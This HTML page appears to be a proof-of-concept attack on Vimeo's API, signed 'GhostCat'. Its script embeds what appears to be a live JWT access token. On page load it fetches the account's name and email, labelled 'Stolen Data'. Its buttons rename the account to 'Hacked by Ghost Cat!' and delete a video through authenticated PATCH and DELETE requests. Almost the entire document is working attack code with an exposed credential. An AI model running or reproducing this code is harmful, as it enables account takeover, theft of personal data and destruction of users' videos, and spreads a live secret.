<!DOCTYPE html>
<html>
<head>
    <title>Vimeo by GhostCat</title>
</head>
<body>
    <h1>Click to Update and Delete!</h1>
    <button onclick="exploitVimeo()">Update Name to "Hacked by Ghost Cat!"</button>
    <br><br>
    <button onclick="deleteVideo()"> Video Delete!</button>
    <div id="result"></div>

    <script>
    async function exploitVimeo() {
        const resultDiv = document.getElementById('result');
        try {
            // PATCH request to update name
            const response = await fetch('https://api.vimeo.com/me?fields=name', {
                method: 'PATCH',
                headers: {
                    'Authorization': 'jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4',
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.vimeo.*; version=3.4.2'
                },
                credentials: 'include',  // Cookies auto-send
                body: JSON.stringify({ name: 'Hacked by Ghost Cat!' })
            });

            if (response.ok) {
                const data = await response.json();
                resultDiv.innerHTML = `<p>Success! New name: ${data.name}</p>`;
            } else {
                resultDiv.innerHTML = `<p>Error: ${response.status}</p>`;
            }
        } catch (error) {
            resultDiv.innerHTML = `<p>CORS Exploit Failed: ${error.message}</p>`;
        }
    }

    // Auto-run on load: Steal user info
    async function stealUserInfo() {
        try {
            const response = await fetch('https://api.vimeo.com/me?fields=name,email', {
                credentials: 'include',
                headers: { 
                    'Authorization': 'jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4',
                    'Accept': 'application/vnd.vimeo.*; version=3.4.2' 
                }
            });
            const data = await response.json();
            // data send
            console.log('Stolen Data:', data);  // console
        } catch (e) { 
            console.log('Steal Failed:', e); 
        }
    }
    stealUserInfo();  // Page

    // Delete Video Function
    async function deleteVideo() {
        const resultDiv = document.getElementById('result');
        try {
            // Step 1: List videos with error check
            const listRes = await fetch("https://api.vimeo.com/me/videos?per_page=1", {
                credentials: "include",
                headers: {
                    Authorization: "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4",
                    Accept: "application/vnd.vimeo.*; version=3.4.2",
                },
            });
            
            if (!listRes.ok) {
                resultDiv.innerHTML += `<p>List Error: ${listRes.status} - ${listRes.statusText}. Check token!</p>`;
                return;  // Stop if list fails
            }
            
            const videos = await listRes.json();
            if (!videos.data || videos.data.length === 0) {
                resultDiv.innerHTML += "<p>No videos to delete.</p>";
                return;
            }
            
            const videoId = videos.data[0].uri.split("/").pop();
            // Step 2: Delete
            const deleteRes = await fetch(`https://api.vimeo.com/videos/${1125449421}`, {
                method: "DELETE",
                headers: { 
                    Authorization: "jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NTk5MTkwNDAsInVzZXJfaWQiOjI0ODI1NDA0NywiYXBwX2lkIjo1ODQ3OSwic2NvcGVzIjoicHVibGljIGludGVyYWN0IHByaXZhdGUgdXBsb2FkIGNyZWF0ZSBlZGl0IGRlbGV0ZSBlbWFpbCBzdGF0cyB2aWRlb19maWxlcyIsInRlYW1fdXNlcl9pZCI6bnVsbCwianRpIjoiMzhjYWU1N2ItM2I1Yy00NzhjLTlmNzUtYzUxNzg0Yzg4Y2NlIiwic2giOiIwOGJhZjM2MDFkYmQwOTYxMzc0ZjExM2YyMzQ4MjU4MWNkM2YzYzJlMzU5MzEzZjk3NGQ2NjEyODk2MGU4NGFiIn0.crGbPinA0nfhpHqvwXvLaGlyH7H9q6mrqSuQVpuQqj4"
                },
            });
            
            if (deleteRes.ok) {
                resultDiv.innerHTML += "<p>Video Deleted Successfully!.</p>";
            } else {
                resultDiv.innerHTML += `<p>Delete Error: ${deleteRes.status}</p>`;
            }
        } catch (error) {
            resultDiv.innerHTML += `<p>Delete Failed: ${error.message}</p>`;
        }
    }
    </script>
</body>
</html>
